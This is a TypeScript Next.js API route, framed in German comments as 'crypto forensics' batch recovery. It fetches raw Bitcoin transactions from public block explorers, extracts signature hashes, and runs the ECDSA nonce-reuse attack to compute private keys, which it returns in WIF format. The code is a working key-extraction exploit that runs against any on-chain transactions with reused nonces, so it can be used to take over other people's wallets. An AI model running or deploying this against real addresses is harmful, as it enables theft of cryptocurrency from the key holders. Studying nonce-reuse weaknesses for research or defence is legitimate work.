import { NextResponse } from "next/server";
import { createHash } from "crypto";
import {
  SECP256K1,
  mod,
  modInverse,
  getOppositeS,
  encodeWIF,
} from "@/lib/crypto-forensics/ec-engine";
import {
  parseBitcoinTx,
  computeSigHashAll,
  extractP2PKHSig,
  p2pkhScriptCodeFromPubkey,
} from "@/lib/crypto-forensics/bitcoin-tx-parser";

// ============================================================================
// Z-Wert Extraktion aus echten Transaktionen (Blockstream / mempool.space)
// ============================================================================

const TX_SOURCES = [
  "https://blockstream.info/api",
  "https://mempool.space/api",
];

/** Fetch raw transaction hex from public explorers */
async function fetchRawTx(txid: string): Promise<string | null> {
  const clean = txid.trim().toLowerCase();
  if (!/^[0-9a-f]{64}$/.test(clean)) return null; // kein Pseudo-Hash

  for (const base of TX_SOURCES) {
    try {
      const res = await fetch(`${base}/tx/${clean}/hex`, {
        signal: AbortSignal.timeout(10000),
        headers: { "User-Agent": "ForensProto/BatchRecovery" },
      });
      if (res.ok) {
        const hex = (await res.text()).trim();
        if (/^[0-9a-fA-F]+$/.test(hex) && hex.length > 20) return hex;
      }
    } catch {
      /* nächste Quelle */
    }
  }
  return null;
}

/**
 * Extrahiert den echten SIGHASH (z) für ein Input, dessen Signatur den
 * gegebenen r-Wert trägt. Kein double-SHA256 der gesamten Tx mehr.
 */
function extractZForR(rawTxHex: string, rHex: string): string | null {
  try {
    const rNorm = rHex.replace(/^0+/, "").toLowerCase() || "0";
    const tx = parseBitcoinTx(rawTxHex);

    for (let i = 0; i < tx.inputs.length; i++) {
      const inp = tx.inputs[i];
      // Legacy P2PKH scriptSig: <sig> <pubkey>
      const ex = extractP2PKHSig(inp.scriptSig);
      if (ex) {
        const r = (ex.rHex.replace(/^0+/, "") || "0").toLowerCase();
        if (r === rNorm) {
          const scriptCode = p2pkhScriptCodeFromPubkey(ex.pubkeyHex);
          return computeSigHashAll(tx, i, scriptCode);
        }
      }
    }
    return null;
  } catch {
    return null;
  }
}

async function resolveZFromTxid(
  txid: string | undefined,
  rHex: string
): Promise<{ z: string | null; source: ZSource }> {
  if (!txid || !/^[0-9a-fA-F]{64}$/.test(txid.trim())) {
    return { z: null, source: "missing" };
  }
  const raw = await fetchRawTx(txid);
  if (!raw) return { z: null, source: "missing" };
  const z = extractZForR(raw, rHex);
  if (!z) return { z: null, source: "missing" };
  return { z, source: "blockstream" };
}

/** Run godfather recovery math for one nonce-reuse group */
function recoverKey(
  rHex: string,
  s1Hex: string,
  s2Hex: string,
  z1Hex: string,
  z2Hex: string
): {
  success: boolean;
  tests: { name: string; status: string; d?: string }[];
  recoveredKey?: string;
  wifCompressed?: string;
  wifUncompressed?: string;
} {
  const n = SECP256K1.n;
  const r = BigInt("0x" + rHex);
  const z1 = BigInt("0x" + z1Hex);
  const z2 = BigInt("0x" + z2Hex);

  const s1_orig = BigInt("0x" + s1Hex);
  const s2_orig = BigInt("0x" + s2Hex);

  const combos = [
    { name: "Combo 1 (+s1, +s2)", s1: s1_orig, s2: s2_orig },
    { name: "Combo 2 (Low-S check (-s1, +s2))", s1: getOppositeS(s1_orig), s2: s2_orig },
    { name: "Combo 3 (Low-S check (+s1, -s2))", s1: s1_orig, s2: getOppositeS(s2_orig) },
    { name: "Combo 4 (-s1, -s2)", s1: getOppositeS(s1_orig), s2: getOppositeS(s2_orig) },
  ];

  const tests: { name: string; status: string; d?: string }[] = [];
  let successfulKey: string | null = null;

  for (const combo of combos) {
    try {
      const sDiff = mod(combo.s1 - combo.s2, n);
      if (sDiff !== 0n) {
        const zDiff = mod(z1 - z2, n);
        const k = mod(zDiff * modInverse(sDiff, n), n);

        if (k !== 0n) {
          const rInv = modInverse(r, n);
          const d = mod((mod(combo.s1 * k, n) - z1) * rInv, n);

          if (d > 0n && d < n) {
            const dHex = d.toString(16).padStart(64, "0");
            tests.push({ name: combo.name, status: "MATCH", d: dHex });
            if (!successfulKey) successfulKey = dHex;
            continue;
          }
        }
      }
    } catch {
      // math error
    }
    tests.push({ name: combo.name, status: "MISMATCH" });
  }

  if (successfulKey) {
    return {
      success: true,
      tests,
      recoveredKey: successfulKey,
      wifCompressed: encodeWIF(successfulKey, true),
      wifUncompressed: encodeWIF(successfulKey, false),
    };
  }

  return { success: false, tests };
}

// ============================================================================
// POST Handler — Exhaustive Batch Recovery
// ============================================================================

interface NonceGroup {
  rValueFull: string;
  s1: string;
  s2: string;
  /** echte TxIDs (bevorzugt) */
  txHash1?: string;
  txHash2?: string;
  /** legacy field names */
  mockedTxHash1?: string;
  mockedTxHash2?: string;
  z1Override?: string;
  z2Override?: string;
}

/**
 * Quelle eines z-Werts. "override"/"blockstream" = echte, aus einer
 * realen Transaktion stammende Daten. "simulated" nur bei explizitem Opt-in.
 */
type ZSource = "override" | "blockstream" | "simulated" | "missing";

function isRealSource(s: ZSource): boolean {
  return s === "override" || s === "blockstream";
}

export async function POST(req: Request) {
  try {
    const body = (await req.json()) as { groups: NonceGroup[]; allowSimulated?: boolean };
    const { groups } = body;
    // Standard: KEINE erfundenen z-Werte. allowSimulated=true → klar markierte PoC-Simulation.
    const allowSimulated = body.allowSimulated === true;

    if (!groups || !Array.isArray(groups) || groups.length === 0) {
      return NextResponse.json({ error: "Keine Nonce-Gruppen übergeben" }, { status: 400 });
    }

    const results: {
      index: number;
      rValue: string;
      txHash1?: string;
      txHash2?: string;
      z1Source: ZSource;
      z2Source: ZSource;
      forensicallyValid: boolean;
      warning?: string;
      recovery: ReturnType<typeof recoverKey> | { success: false; tests: []; skipped: true };
    }[] = [];

    for (let i = 0; i < groups.length; i++) {
      const group = groups[i];
      const tx1 = group.txHash1 || group.mockedTxHash1;
      const tx2 = group.txHash2 || group.mockedTxHash2;

      let z1: string | null = group.z1Override || null;
      let z2: string | null = group.z2Override || null;
      let z1Source: ZSource = group.z1Override ? "override" : "missing";
      let z2Source: ZSource = group.z2Override ? "override" : "missing";

      // Echte SIGHASH-Extraktion aus On-Chain-Tx (r-matched Input)
      if (!z1 && tx1) {
        const r = await resolveZFromTxid(tx1, group.rValueFull);
        if (r.z) {
          z1 = r.z;
          z1Source = r.source;
        }
      }
      if (!z2 && tx2) {
        const r = await resolveZFromTxid(tx2, group.rValueFull);
        if (r.z) {
          z2 = r.z;
          z2Source = r.source;
        }
      }

      const missingReal = !z1 || !z2;

      if (missingReal && !allowSimulated) {
        results.push({
          index: i,
          rValue: group.rValueFull,
          txHash1: tx1,
          txHash2: tx2,
          z1Source,
          z2Source,
          forensicallyValid: false,
          warning:
            "Übersprungen: keine echten z-Werte (weder Override noch r-matched SIGHASH aus TxID). " +
            "Nutzen Sie den Adress-Nonce-Scanner (liefert z + TxID) oder setzen Sie z-Overrides. " +
            "allowSimulated=true erzeugt nur eine markierte Proof-of-Concept-Rechnung — KEIN echtes Recovery.",
          recovery: { success: false, tests: [], skipped: true },
        });
        continue;
      }

      // Nur bei explizitem Opt-in: deterministische Fake-z (klar markiert)
      if (!z1) {
        z1 = createHash("sha256")
          .update(`forensic_z1_${group.rValueFull}_${i}`)
          .digest("hex");
        z1Source = "simulated";
      }
      if (!z2) {
        z2 = createHash("sha256")
          .update(`forensic_z2_${group.rValueFull}_${i}`)
          .digest("hex");
        z2Source = "simulated";
      }

      const recovery = recoverKey(group.rValueFull, group.s1, group.s2, z1, z2);
      const forensicallyValid = isRealSource(z1Source) && isRealSource(z2Source);

      results.push({
        index: i,
        rValue: group.rValueFull,
        txHash1: tx1,
        txHash2: tx2,
        z1Source,
        z2Source,
        forensicallyValid,
        warning: forensicallyValid
          ? undefined
          : "SIMULATION: mindestens ein z-Wert ist nicht aus einer echten Transaktion. " +
            "Kein forensisch verwertbarer Private-Key-Fund.",
        recovery,
      });
    }

    const successCount = results.filter((r) => r.recovery.success).length;
    const verifiedSuccessCount = results.filter(
      (r) => r.recovery.success && r.forensicallyValid
    ).length;
    const simulatedSuccessCount = successCount - verifiedSuccessCount;
    const skippedCount = results.filter(
      (r) => "skipped" in r.recovery && r.recovery.skipped
    ).length;

    return NextResponse.json({
      success: true,
      totalGroups: groups.length,
      successCount,
      verifiedSuccessCount,
      simulatedSuccessCount,
      failureCount: groups.length - successCount - skippedCount,
      skippedCount,
      allowSimulated,
      results,
      timestamp: new Date().toISOString(),
    });
  } catch (err: unknown) {
    return NextResponse.json(
      {
        error:
          "Batch-Recovery fehlgeschlagen: " +
          (err instanceof Error ? err.message : String(err)),
      },
      { status: 500 }
    );
  }
}
